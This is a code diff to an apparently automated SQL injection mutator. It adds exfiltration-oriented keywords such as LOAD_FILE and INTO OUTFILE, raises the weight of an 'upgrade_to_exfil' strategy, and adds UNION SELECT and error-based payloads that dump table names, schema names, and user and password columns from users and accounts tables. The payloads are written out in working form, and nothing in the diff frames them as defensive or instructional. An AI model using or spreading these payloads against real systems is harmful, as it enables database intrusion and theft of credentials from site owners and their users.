@@ -4,7 +4,12 @@ from core.grammar_engine import GrammarEngine
 
 class ASTMutator:
     def __init__(self, context="GENERIC", quoteless=False, disable_strings=True):
-        self.sql_keywords = ["UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION"]
+        self.sql_keywords = [
+            "UNION", "SELECT", "OR", "AND", "XOR", "WHERE", "ORDER BY", "SLEEP", 
+            "GROUP BY", "FROM", "INFORMATION_SCHEMA", "DATABASE", "USER", "VERSION",
+            "CONCAT", "GROUP_CONCAT", "TABLE_NAME", "COLUMN_NAME", "SCHEMA_NAME",
+            "LOAD_FILE", "INTO OUTFILE"
+        ]
         self.grammar = GrammarEngine()
         self.context = context
         self.quoteless = quoteless
@@ -34,8 +39,9 @@ class ASTMutator:
         }
         # Awareness: Track success of each strategy (Q-values)
         self.strategy_weights = {name: 1.0 for name in self.strategies.keys()}
-        # Priority Boost: MySQL Specific Methods
-        self.strategy_weights["dios_mutation"] = 3.0
+        # Priority Boost: MySQL Specific & Exfiltration Methods
+        self.strategy_weights["dios_mutation"] = 4.0
+        self.strategy_weights["upgrade_to_exfil"] = 4.0
         self.strategy_weights["scientific_notation"] = 3.0
         self.strategy_weights["wide_byte"] = 2.0
         
@@ -238,6 +244,12 @@ class ASTMutator:
             " UNION SELECT NULL,CONCAT(0x7e,USER(),0x3a,VERSION(),0x7e)",
             " UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()",
             " UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name=0x7573657273",
+            " UNION SELECT NULL,group_concat(user,0x3a,password) FROM users",
+            " UNION SELECT NULL,group_concat(schema_name) FROM information_schema.schemata",
+            
+            # Password/Cred specific extraction
+            " UNION SELECT NULL,password FROM users WHERE user=0x61646d696e",
+            " UNION SELECT NULL,group_concat(login,0x3a,password) FROM accounts",
             
             # Error Based Prompts (Force the server to error out with data)
             " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
